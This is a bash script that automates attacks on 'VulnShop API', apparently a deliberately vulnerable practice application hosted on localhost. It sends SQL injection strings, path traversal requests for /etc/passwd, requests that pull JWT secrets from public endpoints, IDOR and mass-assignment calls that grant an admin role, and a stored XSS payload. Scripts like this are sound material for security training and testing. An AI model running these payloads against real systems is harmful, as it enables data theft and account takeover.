#!/bin/bash

# Comprehensive, non-destructive attack script for VulnShop API
# This script tests for sensitive data exposure, lack of authentication,
# and other OWASP Top 10 vulnerabilities.

# --- Configuration ---
# Default to localhost, but allow overriding with an environment variable
API_BASE_URL=${API_BASE_URL:-"http://localhost:3001"}
echo "Targeting API at: $API_BASE_URL"
echo "---"

# --- Helper Functions ---
function print_header() {
    echo -e "\n\n=================================================="
    echo -e "  $1"
    echo -e "==================================================\n"
}

function run_test() {
    local test_name="$1"
    local command="$2"
    
    echo -e "--- Starting Test: $test_name ---"
    eval $command
    echo -e "\n--- Test Complete: $test_name ---\n"
    sleep 1
}

# --- Attack Scenarios ---

# 1. Lack of Authentication & Information Disclosure
print_header "Testing Public Endpoints (No Authentication Required)"

run_test "Discover API Endpoints" \
    "curl -s -X GET '$API_BASE_URL/api/discovery' | jq"

run_test "Fetch All Users (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/users' | jq '.users[0]'"

run_test "Fetch System Information (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/system-info' | jq '.system.env.JWT_SECRET'"

run_test "Fetch Database Schema (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/db-schema' | jq"

run_test "Fetch Recent Orders (Sensitive Data Exposure)" \
    "curl -s -X GET '$API_BASE_URL/api/public/recent-orders' | jq '.orders[0]'"

run_test "Fetch App Configuration (Exposing JWT Secret)" \
    "curl -s -X GET '$API_BASE_URL/api/public/config' | jq"

run_test "Fetch Debug Information" \
    "curl -s -X GET '$API_BASE_URL/api/public/debug' | jq '.routes[0]'"

# 2. Injection Attacks
print_header "Testing Injection Vulnerabilities"

run_test "SQL Injection - User Search (Bypass Auth)" \
    "curl -s -G '$API_BASE_URL/api/public/user-search' --data-urlencode \"username=' OR '1'='1' --\" | jq '.results[0]'"

run_test "SQL Injection - Product Search (Error-Based)" \
    "curl -s -G '$API_BASE_URL/api/products/search' --data-urlencode \"q='\" | jq"

# 3. Path Traversal
print_header "Testing Path Traversal"

run_test "Attempt to Read /etc/passwd" \
    "curl -s -X GET '$API_BASE_URL/api/public/files?path=../../../../../../../../etc/passwd'"

run_test "Attempt to Read package.json" \
    "curl -s -X GET '$API_BASE_URL/api/public/files?path=./package.json' | jq '.name'"

# 4. Broken Authentication & Access Control
print_header "Testing Authentication and Access Control"

run_test "Register a New User" \
    "curl -s -X POST -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"email\":\"attacker@test.com\",\"password\":\"password123\"}' '$API_BASE_URL/api/register' | jq"

TOKEN=$(curl -s -X POST -H "Content-Type: application/json" -d '{"username":"attacker","email":"attacker@test.com","password":"password123"}' "$API_BASE_URL/api/login" | jq -r '.token')

if [ -z "$TOKEN" ]; then
    echo "Failed to get token for attacker. Exiting."
    exit 1
fi
echo "Successfully logged in as 'attacker'"

run_test "Attempt IDOR to Access Admin's Order (Order ID 1)" \
    "curl -s -X GET -H \"Authorization: Bearer $TOKEN\" '$API_BASE_URL/api/orders/1' | jq"

run_test "Attempt to Export Admin's Data (User ID 1)" \
    "curl -s -X GET -H \"Authorization: Bearer $TOKEN\" '$API_BASE_URL/api/users/1/export' | jq '.user'"

# 5. Mass Assignment
print_header "Testing Mass Assignment Vulnerability"

run_test "Register New User with Admin Role" \
    "curl -s -X POST -H 'Content-Type: application/json' -d '{\"username\":\"eviladmin\",\"email\":\"evil@test.com\",\"password\":\"password123\",\"role\":\"admin\"}' '$API_BASE_URL/api/register' | jq"

ADMIN_TOKEN=$(curl -s -X POST -H "Content-Type: application/json" -d '{"username":"eviladmin","password":"password123"}' "$API_BASE_URL/api/login" | jq -r '.token')

if [ -z "$ADMIN_TOKEN" ]; then
    echo "Failed to get token for eviladmin. Test may have failed."
else
    echo "Successfully logged in as 'eviladmin' - mass assignment likely successful!"
    run_test "Verify Admin Access by Fetching All Users" \
        "curl -s -X GET -H \"Authorization: Bearer $ADMIN_TOKEN\" '$API_BASE_URL/api/admin/users' | jq '.users[0]'"
fi

# 6. Cross-Site Scripting (XSS)
print_header "Testing XSS in Product Reviews"

run_test "Submit Review with XSS Payload" \
    "curl -s -X POST -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' -d '{\"rating\":5,\"comment\":\"<script>alert(\\\"XSS\\\")</script>\"}' '$API_BASE_URL/api/products/1/reviews' | jq"

run_test "Verify XSS Payload is Stored" \
    "curl -s -X GET '$API_BASE_URL/api/products/1' | jq '.reviews[] | select(.comment | contains(\"<script>\"))'"

echo -e "\n\n=================================================="
echo -e "  All non-destructive attacks completed."
echo -e "==================================================\n" 